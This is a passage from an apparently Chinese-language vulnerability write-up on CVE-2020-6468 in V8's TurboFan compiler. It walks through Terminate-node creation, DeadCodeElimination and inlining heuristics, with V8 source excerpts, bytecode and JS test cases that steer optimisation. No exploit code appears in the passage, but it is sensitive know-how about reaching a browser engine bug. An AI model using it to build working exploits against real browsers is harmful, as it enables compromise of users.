<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::BuildGraphFromBytecode</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::CreateGraph</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      <span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::VisitBytecodes</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::VisitSingleBytecode</span><span class="params">()</span></span></span><br><span class="line"><span class="function">          <span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::BuildLoopHeaderEnvironment</span><span class="params">(<span class="keyword">int</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">void</span> BytecodeGraphBuilder::<span class="title">Environment::PrepareForLoop</span><span class="params">(...)</span></span></span><br></pre></td></tr></table></figure>
<p>添加的具体代码见如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> BytecodeGraphBuilder::Environment::PrepareForLoop(</span><br><span class="line">    <span class="keyword">const</span> BytecodeLoopAssignments&amp; assignments,</span><br><span class="line">    <span class="keyword">const</span> BytecodeLivenessState* liveness) &#123;</span><br><span class="line">  <span class="comment">// Create a control node for the loop header.</span></span><br><span class="line">  Node* control = builder()-&gt;NewLoop();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 建立 Phi 相关的结点</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">// The accumulator should not be live on entry.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Connect to the loop end.</span></span><br><span class="line">  <span class="comment">// 这里添加了 terminate 结点</span></span><br><span class="line">  Node* <span class="built_in">terminate</span> = builder()-&gt;graph()-&gt;NewNode(</span><br><span class="line">      builder()-&gt;common()-&gt;Terminate(), effect, control);</span><br><span class="line">  builder()-&gt;exit_controls_.push_back(<span class="built_in">terminate</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>但需要注意的是，并不是一执行<code>BuildGraphFromBytecode</code>函数就一定能添加 terminate 结点，该添加操作还受到一个判断条件的约束，只有满足 LoopHeader 的 Bytecode 才能添加 terminate 结点：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::BuildLoopHeaderEnvironment</span><span class="params">(<span class="keyword">int</span> current_offset)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 注意该判断条件</span></span><br><span class="line">  <span class="keyword">if</span> (bytecode_analysis().IsLoopHeader(current_offset)) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add loop header.</span></span><br><span class="line">    environment()-&gt;PrepareForLoop(loop_info.assignments(), liveness);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>为了<strong>通过该 LoopHeader 的判断条件</strong>，我们需要继续向下探究。LoopHeader 实际以如下调用链添加进 BytecodeAnalysis 实例中：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::BuildGraphFromBytecode</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">    <span class="title">BytecodeGraphBuilder::BytecodeGraphBuilder</span><span class="params">(,...)</span></span></span><br><span class="line"><span class="function">      BytecodeAnalysis <span class="keyword">const</span>&amp; <span class="title">JSHeapBroker::GetBytecodeAnalysis</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">        <span class="title">BytecodeAnalysis::BytecodeAnalysis</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function">          <span class="keyword">void</span> <span class="title">BytecodeAnalysis::Analyze</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            <span class="keyword">void</span> <span class="title">BytecodeAnalysis::PushLoop</span><span class="params">(...)</span> <span class="comment">// 添加 LoopHeader</span></span></span><br></pre></td></tr></table></figure>
<p>通过审计 BytecodeAnalysis::Analyze 函数的代码，我们可以发现， 只有当 bytecode 为 <code>Bytecode::kJumpLoop</code>时， LoopHeader 才会被添加进 BytecodeAnalysis 实例中：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BytecodeAnalysis::Analyze</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 遍历 bytecode</span></span><br><span class="line">    <span class="function">interpreter::BytecodeArrayRandomIterator <span class="title">iterator</span><span class="params">(bytecode_array(), zone())</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (iterator.GoToEnd(); iterator.IsValid(); --iterator) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">        <span class="comment">// 当 bytecode 为 JumpLoop 时</span></span><br><span class="line">        <span class="keyword">if</span> (bytecode == Bytecode::kJumpLoop) &#123;</span><br><span class="line">          <span class="comment">// Every byte up to and including the last byte within the backwards jump</span></span><br><span class="line">          <span class="comment">// instruction is considered part of the loop, set loop end accordingly.</span></span><br><span class="line">          <span class="keyword">int</span> loop_end = current_offset + iterator.current_bytecode_size();</span><br><span class="line">          <span class="keyword">int</span> loop_header = iterator.GetJumpTargetOffset();</span><br><span class="line">          <span class="comment">// 添加 LoopHeader</span></span><br><span class="line">          PushLoop(loop_header, loop_end);</span><br><span class="line">          <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>那么，什么样的 JS 代码生成的 bytecode 中会有 <code>Bytecode::kJumpLoop</code> 呢？通过测试我们发现，<strong>任何的循环都会有<code>JumpLoop</code> 字节码</strong>。<code>JumpLoop</code>实际上与汇编中循环末尾的 JMP 指令没什么太大的差异，只是 v8 中的字节码显著标识<strong>该 Jump 操作跳转回 Loop 里</strong>。</p>
<p>以下是一个测试用的 JS 代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> a = <span class="number">0</span>; a &lt; ii; a++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(ii);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对应生成的 bytecode：</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">15</span> E&gt; <span class="number">0x11ce08250232</span> @    <span class="number">0</span> : a7                StackCheck </span><br><span class="line"><span class="number">38</span> S&gt; <span class="number">0x11ce08250233</span> @    <span class="number">1</span> : <span class="number">0b</span>                LdaZero </span><br><span class="line">      <span class="number">0x11ce08250234</span> @    <span class="number">2</span> : <span class="number">26</span> fb             Star <span class="built_in">r0</span></span><br><span class="line"><span class="number">43</span> S&gt; <span class="number">0x11ce08250236</span> @    <span class="number">4</span> : <span class="number">25</span> <span class="number">02</span>             Ldar a0</span><br><span class="line"><span class="number">43</span> E&gt; <span class="number">0x11ce08250238</span> @    <span class="number">6</span> : <span class="number">69</span> fb <span class="number">00</span>          TestLessThan <span class="built_in">r0</span>, [<span class="number">0</span>]</span><br><span class="line">      <span class="number">0x11ce0825023b</span> @    <span class="number">9</span> : 9a 1c             JumpIfFalse [<span class="number">28</span>] (<span class="number">0x11ce08250257</span> @ <span class="number">37</span>)</span><br><span class="line"><span class="number">26</span> E&gt; <span class="number">0x11ce0825023d</span> @   <span class="number">11</span> : a7                StackCheck </span><br><span class="line"><span class="number">68</span> S&gt; <span class="number">0x11ce0825023e</span> @   <span class="number">12</span> : <span class="number">13</span> <span class="number">00</span> <span class="number">01</span>          LdaGlobal [<span class="number">0</span>], [<span class="number">1</span>]</span><br><span class="line">      <span class="number">0x11ce08250241</span> @   <span class="number">15</span> : <span class="number">26</span> f9             Star <span class="built_in">r2</span></span><br><span class="line"><span class="number">76</span> E&gt; <span class="number">0x11ce08250243</span> @   <span class="number">17</span> : <span class="number">28</span> f9 <span class="number">01</span> <span class="number">03</span>       LdaNamedProperty <span class="built_in">r2</span>, [<span class="number">1</span>], [<span class="number">3</span>]</span><br><span class="line">      <span class="number">0x11ce08250247</span> @   <span class="number">21</span> : <span class="number">26</span> fa             Star <span class="built_in">r1</span></span><br><span class="line"><span class="number">76</span> E&gt; <span class="number">0x11ce08250249</span> @   <span class="number">23</span> : <span class="number">59</span> fa f9 <span class="number">02</span> <span class="number">05</span>    CallProperty1 <span class="built_in">r1</span>, <span class="built_in">r2</span>, a0, [<span class="number">5</span>]</span><br><span class="line"><span class="number">50</span> S&gt; <span class="number">0x11ce0825024e</span> @   <span class="number">28</span> : <span class="number">25</span> fb             Ldar <span class="built_in">r0</span></span><br><span class="line">      <span class="number">0x11ce08250250</span> @   <span class="number">30</span> : 4c <span class="number">07</span>             <span class="keyword">Inc</span> [<span class="number">7</span>]</span><br><span class="line">      <span class="number">0x11ce08250252</span> @   <span class="number">32</span> : <span class="number">26</span> fb             Star <span class="built_in">r0</span></span><br><span class="line">      <span class="number">0x11ce08250254</span> @   <span class="number">34</span> : 8a 1e <span class="number">00</span>          JumpLoop [<span class="number">30</span>], [<span class="number">0</span>] (<span class="number">0x11ce08250236</span> @ <span class="number">4</span>) # 注意这里的 JumpLoop</span><br><span class="line">      <span class="number">0x11ce08250257</span> @   <span class="number">37</span> : <span class="number">0d</span>                LdaUndefined </span><br><span class="line"><span class="number">92</span> S&gt; <span class="number">0x11ce08250258</span> @   <span class="number">38</span> : ab                Return</span><br></pre></td></tr></table></figure>
<p>通过在 turbolizer 中观察生成的图，可以看到在 BytecodeGraphBuild 阶段成功生成了一个 Terminate 结点：</p>
<p><img src="/2021/02/CVE-2020-6468/terminateNode.png" alt="img"></p>
</li>
</ul>
<h4 id="d-DeadCodeElimination优化">d. DeadCodeElimination优化</h4>
<p>DeadCodeElimination 分别位于 <strong>InliningPhase、TypedLoweringPhase等等</strong>，主要将一些 DeadCode 从图中去除，在此我们只侧重讨论其中的部分优化函数。</p>
<h5 id="1-ReduceLoopOrMerge">1) ReduceLoopOrMerge</h5>
<p>在上文中我们已经说明，JS 代码中任意的循环均会生成 JumpLoop 的字节码，并进一步生成 Terminate 结点。</p>
<p>但在实际的动态调试过程中，我们发现该 Terminate 结点在 BytecodeGraphBuilder 阶段生成后，<strong>可在 inlining 优化中的 DeadCodeElimination被优化掉</strong>，当且仅当 <strong>Loop 结点只有一个 input</strong>。</p>
<p>其中该结点的关键优化函数即为ReduceLoopOrMerge：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Reduction <span class="title">DeadCodeElimination::ReduceLoopOrMerge</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 计算活跃的input，并将活跃input向前移动</span></span><br><span class="line">  <span class="keyword">int</span> live_input_count = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> (live_input_count == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> Replace(dead());</span><br><span class="line">  <span class="comment">// 如果只有 **一个** 活跃输入</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (live_input_count == <span class="number">1</span>) &#123;</span><br><span class="line">    NodeVector loop_exits(zone_);</span><br><span class="line">    <span class="comment">// 遍历所有 Loop 结点的 use 点，即 dest 结点</span></span><br><span class="line">    <span class="keyword">for</span> (Node* <span class="keyword">const</span> use : node-&gt;uses()) &#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 处理 Terminate 结点</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (use-&gt;opcode() == IrOpcode::kTerminate) &#123;</span><br><span class="line">        DCHECK_EQ(IrOpcode::kLoop, node-&gt;opcode());</span><br><span class="line">        <span class="comment">// 将 Terminate 结点杀死</span></span><br><span class="line">        Replace(use, dead());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 将当前 Loop 结点优化去除</span></span><br><span class="line">    <span class="keyword">return</span> Replace(node-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">return</span> NoChange();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那有没有什么办法能绕过 Loop 结点的优化操作呢？那就是<strong>提高函数调用次数</strong>，使得<strong>增加其 type feedback</strong>（调试坑点之一！）。</p>
<p>以下面这个 test case 为例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt_me</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> a = <span class="number">0</span>; a &lt; <span class="number">3</span>; a ++)</span><br><span class="line">        <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">opt_me();</span><br><span class="line">%PrepareFunctionForOptimization(opt_me);</span><br><span class="line"><span class="comment">// opt_me 函数执行次数较少</span></span><br><span class="line">%OptimizeFunctionOnNextCall(opt_me);</span><br><span class="line">opt_me();</span><br></pre></td></tr></table></figure>
<p>将会生成如下的图。注意 Loop 结点只有一个 input，此时一旦 DeadCodeElimination 遇到 Loop 结点，该优化将会<strong>立即消除</strong> Terminate 结点。</p>
<p><img src="/2021/02/CVE-2020-6468/looplittle.png" alt="img"></p>
<p>而倘若多运行几次目标函数，即：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt_me</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> a = <span class="number">0</span>; a &lt; <span class="number">3</span>; a ++)</span><br><span class="line">        <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">opt_me();</span><br><span class="line">%PrepareFunctionForOptimization(opt_me);</span><br><span class="line"><span class="comment">// 这里多运行了22次</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> a = <span class="number">0</span>; a &lt; <span class="number">22</span>; a++)</span><br><span class="line">    opt_me();</span><br><span class="line">%OptimizeFunctionOnNextCall(opt_me);</span><br><span class="line">opt_me();</span><br></pre></td></tr></table></figure>
<p>那么就会产生以下大相径庭的图，其中 Loop 又多了一个 JSCall 的 input，因此 terminate 结点将在执行完 inlinePhase 后被保留：</p>
<p><img src="/2021/02/CVE-2020-6468/loopmany.png" alt="img"></p>
<h5 id="2-ReduceDeoptimizeOrReturnOrTerminateOrTailCall">2) ReduceDeoptimizeOrReturnOrTerminateOrTailCall</h5>
<p>Terminate 结点只有两个 input ，分别是 EffectPhi (Effect Node) 以及 Loop 结点 (Control Node)。</p>
<p>该函数对 Terminate 结点的优化较为简单：若当前结点存在 dead input，则只重设了该结点的 input，并设置 opcode 为 <code>kThrow</code>，即<strong>将当前 Terminate 结点更新为 Throw 结点</strong>：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Reduction <span class="title">DeadCodeElimination::ReduceDeoptimizeOrReturnOrTerminateOrTailCall</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    Node* node)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// 如果当前结点存在 dead input</span></span><br><span class="line">  <span class="keyword">if</span> (FindDeadInput(node) != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    Node* effect = NodeProperties::GetEffectInput(node, <span class="number">0</span>);</span><br><span class="line">    Node* control = NodeProperties::GetControlInput(node, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 对当前结点添加一些设置</span></span><br><span class="line">    node-&gt;TrimInputCount(<span class="number">2</span>);</span><br><span class="line">    node-&gt;ReplaceInput(<span class="number">0</span>, effect);</span><br><span class="line">    node-&gt;ReplaceInput(<span class="number">1</span>, control);</span><br><span class="line">    <span class="comment">// 将 op 设置为 kThrow</span></span><br><span class="line">    NodeProperties::ChangeOp(node, common()-&gt;Throw());</span><br><span class="line">    <span class="keyword">return</span> Changed(node);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> NoChange();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="e-JSInliningHeuristic-优化">e. JSInliningHeuristic 优化</h4>
<ul>
<li>
<p>JSInliningHeuristic 位于 <strong>InliningPhase</strong>，主要将一些可被内联的函数进行内联。</p>
</li>
<li>
<p><code>JSInliningHeuristic::Reduce</code>将会对传入的 node 类型进行判断，如果是 <code>JSCall</code> 或者 <code>JSConstruct</code> 结点，则进行下一步的判断，直到最后将当前结点加入至 candidates_ 集合中。这里的 Reduce 操作只是<strong>获取了待内联的函数</strong>集合，真正的内联操作位于 Finalize 函数中。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Reduction <span class="title">JSInliningHeuristic::Reduce</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  <span class="function">DisallowHeapAccessIf <span class="title">no_heap_acess</span><span class="params">(broker()-&gt;is_concurrent_inlining())</span></span>;</span><br><span class="line">  <span class="comment">// check1：判断当前结点是否是 JSCall 或者 JSConstruct 结点</span></span><br><span class="line">  <span class="keyword">if</span> (!IrOpcode::IsInlineeOpcode(node-&gt;opcode())) <span class="keyword">return</span> NoChange();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// check2：Check if the &#123;node&#125; is an appropriate candidate for inlining.</span></span><br><span class="line">  Candidate candidate = CollectFunctions(node, kMaxCallPolymorphism);</span><br><span class="line">  <span class="keyword">if</span> (candidate.num_functions == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> NoChange();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (candidate.num_functions &gt; <span class="number">1</span> &amp;&amp; !FLAG_polymorphic_inlining) &#123;</span><br><span class="line">    TRACE(<span class="string">"Not considering call site #"</span></span><br><span class="line">          &lt;&lt; node-&gt;id() &lt;&lt; <span class="string">":"</span> &lt;&lt; node-&gt;op()-&gt;mnemonic()</span><br><span class="line">          &lt;&lt; <span class="string">", because polymorphic inlining is disabled"</span>);</span><br><span class="line">    <span class="keyword">return</span> NoChange();</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// 剩下的一些无关紧要的check，基本上都能通过</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将当前结点加入至 candidates_ 集合中</span></span><br><span class="line">  candidates_.insert(candidate);</span><br><span class="line">  <span class="keyword">return</span> NoChange();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>要想将一个目标的内联函数加入至 candidates_ 集合中，最少要通过 Reduce 函数中的两个关键 check：</p>
<ul>
<li>当前结点为 JSCall 或 JSConstruct。</li>
<li>当前结点的 Callee（即 input[0]）为 Phi 或 JSCreateClosure，并满足一些条件。</li>
</ul>
<p>如果目标函数执行的次数较多，即 <code>Feedback Is Sufficient</code>，那么每个 call 都会生成一个 JSCall 结点，同时第二个 check 也会被通过；但如果<strong>目标函数执行的次数较少</strong>（这种情况尤为发生在调试时），那么 JSCall 结点就不会被插入至图中，更别说通过第二个 Check 了。</p>
<p>以下阐述了<strong>目标函数执行情况</strong> 对 <strong>产生 JSCall 结点</strong>之间的影响，我们先写一段 test case：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> a = <span class="number">0</span>; a &lt; <span class="number">3</span>; a ++)</span><br><span class="line">        <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt_me</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    test();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">opt_me();</span><br><span class="line">%PrepareFunctionForOptimization(opt_me);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> a = <span class="number">0</span>; a &lt; <span class="number">22</span>; a++)</span><br><span class="line">    opt_me();</span><br><span class="line">%OptimizeFunctionOnNextCall(opt_me);</span><br><span class="line">opt_me();</span><br></pre></td></tr></table></figure>
<p>输出函数 opt_me 的字节码，可以发现：调用 test 函数所对应的字节码为<code>CallUndefinedReceiver0</code>，即建立 JSCall 结点的调用链如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::VisitCallUndefinedReceiver0</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::BuildCall</span><span class="params">(ConvertReceiverMode receiver_mode, <span class="built_in">std</span>::<span class="built_in">initializer_list</span>&lt;Node*&gt; args, <span class="keyword">int</span> slot_id)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::BuildCall</span><span class="params">(ConvertReceiverMode receiver_mode, Node* <span class="keyword">const</span>* args, <span class="keyword">size_t</span> arg_count, <span class="keyword">int</span> slot_id)</span></span></span><br></pre></td></tr></table></figure>
<p>对应的 最底层<code>BuidCall</code> 函数源码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::BuildCall</span><span class="params">(ConvertReceiverMode receiver_mode,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     Node* <span class="keyword">const</span>* args, <span class="keyword">size_t</span> arg_count,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     <span class="keyword">int</span> slot_id)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ..</span></span><br><span class="line">  <span class="comment">// 生成 JSCall 的Operator</span></span><br><span class="line">  <span class="keyword">const</span> Operator* op =</span><br><span class="line">      javascript()-&gt;Call(arg_count, frequency, feedback, receiver_mode,</span><br><span class="line">                         speculation_mode, CallFeedbackRelation::kRelated);</span><br><span class="line">  <span class="comment">// 关键！执行 JSTypeHintLowering操作</span></span><br><span class="line">  JSTypeHintLowering::LoweringResult lowering = TryBuildSimplifiedCall(</span><br><span class="line">      op, args, <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(arg_count), feedback.slot);</span><br><span class="line">  <span class="comment">// 如果 JSTypeHintLowering 操作中存在问题，则不插入 JSCall 结点</span></span><br><span class="line">  <span class="keyword">if</span> (lowering.IsExit()) <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">// 执行到这里时，基本上 JSCall 结点将会插入至图中</span></span><br><span class="line">  Node* node = <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">if</span> (lowering.IsSideEffectFree()) &#123;</span><br><span class="line">    node = lowering.value();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    DCHECK(!lowering.Changed());</span><br><span class="line">    node = ProcessCallArguments(op, args, <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(arg_count));</span><br><span class="line">  &#125;</span><br><span class="line">  environment()-&gt;BindAccumulator(node, Environment::kAttachFrameState);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们发现，只有当 TryBuildSimplifiedCall 函数返回的结果不满足 IsExit 条件时， JSCall 结点才会被插入至图中。而进一步跟踪，发现只有当函数的Feedback充足时，才<strong>不会满足</strong> IsExit 条件，并将插入 JSCall 结点。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Node* <span class="title">JSTypeHintLowering::TryBuildSoftDeopt</span><span class="params">(FeedbackSlot slot, Node* effect,</span></span></span><br><span class="line"><span class="function"><span class="params">                                            Node* control,</span></span></span><br><span class="line"><span class="function"><span class="params">                                            DeoptimizeReason reason)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!(flags() &amp; kBailoutOnUninitialized)) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">FeedbackSource <span class="title">source</span><span class="params">(feedback_vector(), slot)</span></span>;</span><br><span class="line">  <span class="comment">// 如果Feedback较少，则继续执行，否则返回 nullptr以 **拒绝** 生成 LoweringResult::Exit</span></span><br><span class="line">  <span class="keyword">if</span> (!broker()-&gt;FeedbackIsInsufficient(source)) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="comment">// 以下是对 Feedback 较少的情况所生成的结点，注意这是一种我们不愿意看到的情况</span></span><br><span class="line">  Node* deoptimize = jsgraph()-&gt;graph()-&gt;NewNode(</span><br><span class="line">      jsgraph()-&gt;common()-&gt;Deoptimize(DeoptimizeKind::kSoft, reason,</span><br><span class="line">                                      FeedbackSource()),</span><br><span class="line">      jsgraph()-&gt;Dead(), effect, control);</span><br><span class="line">  Node* frame_state =</span><br><span class="line">      NodeProperties::FindFrameStateBefore(deoptimize, jsgraph()-&gt;Dead());</span><br><span class="line">  deoptimize-&gt;ReplaceInput(<span class="number">0</span>, frame_state);</span><br><span class="line">  <span class="keyword">return</span> deoptimize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>综上，当函数调用次数较多时，JSCall 才会正常插入至图中，并为接下来内联目标函数提供了有力的基础。</p>
<p><img src="/2021/02/CVE-2020-6468/jscall.png" alt="img">)_</p>
</li>
<li>
<p><code>JSInliningHeuristic::Finalize</code>函数要做的操作很简单，取出 candidates_ 集合中的结点并进行内联操作：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">JSInliningHeuristic::Finalize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="function">DisallowHeapAccessIf <span class="title">no_heap_acess</span><span class="params">(broker()-&gt;is_concurrent_inlining())</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (candidates_.empty()) <span class="keyword">return</span>;  <span class="comment">// Nothing to do without candidates.</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// We inline at most one candidate in every iteration of the fixpoint.</span></span><br><span class="line">  <span class="comment">// This is to ensure that we don't consume the full inlining budget</span></span><br><span class="line">  <span class="comment">// on things that aren't called very often.</span></span><br><span class="line">  <span class="comment">// TODO(bmeurer): Use std::priority_queue instead of std::set here.</span></span><br><span class="line">  <span class="keyword">while</span> (!candidates_.empty()) &#123;</span><br><span class="line">    <span class="keyword">auto</span> i = candidates_.begin();</span><br><span class="line">    Candidate candidate = *i;</span><br><span class="line">    candidates_.erase(i);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断当前 inline 的函数是否是 dead code</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对目标函数的大小以及已经 inline 的大小进行限制</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      万事无误，开始执行内联操作...</span></span><br><span class="line"><span class="comment">      InlineCandidate 函数将会把 JSCall/JSConstruct 结点，用另一个函数的子图来扩展。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    Reduction <span class="keyword">const</span> reduction = InlineCandidate(candidate, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (reduction.Changed()) <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>JSInliningHeuristic::Finalize</code>函数中所调用的<code>InlineCandidate</code>函数，将会<strong>用另一个函数的子图来扩展当前 JSCall/JSConstruct结点</strong>。</p>
<p>这整个<strong>将某个函数内联进图</strong>的操作，关键在于：</p>
<ul>
<li>另一个函数的图是直接在<code>InlineCandidate</code>函数中，通过 BytecodeGraphBuilder 建立，因此新图中的所有结点<strong>尚未经过任何的优化</strong>。</li>
<li>同时，由于此时已经位于 GraphReducer 中的 Finalize 阶段，因此新加入至图中的结点将不会经过 DeadCodeElimination 的优化操作（注意<strong>这里指的 DeadCodeElimination 位于 inliningPhase</strong> ）。</li>
</ul>
<p>所以，另一个函数中的 Loop &amp; Terminate 结点均可保留，即通过 inliningPhase 后的图，仍然可以保留 Loop &amp; Terminate 结点。</p>
<p><img src="/2021/02/CVE-2020-6468/loop_terminate.png" alt="img"></p>
</li>
</ul>
<h4 id="f-Schedule-AddThrow函数">f. Schedule::AddThrow函数</h4>
<ul>
<li>
<p>JIT 中 EffectControlLinearizationPhase 主要完成以下工作：</p>
<ul>
<li>建立一个 <code>Scheduler</code></li>
<li>使用 <code>Scheduler</code> 重建控制流（control chain）和效果流（effect chain）</li>
<li>在重建时，优化部分操作并将其连接至 控制流/效果流中。</li>
</ul>
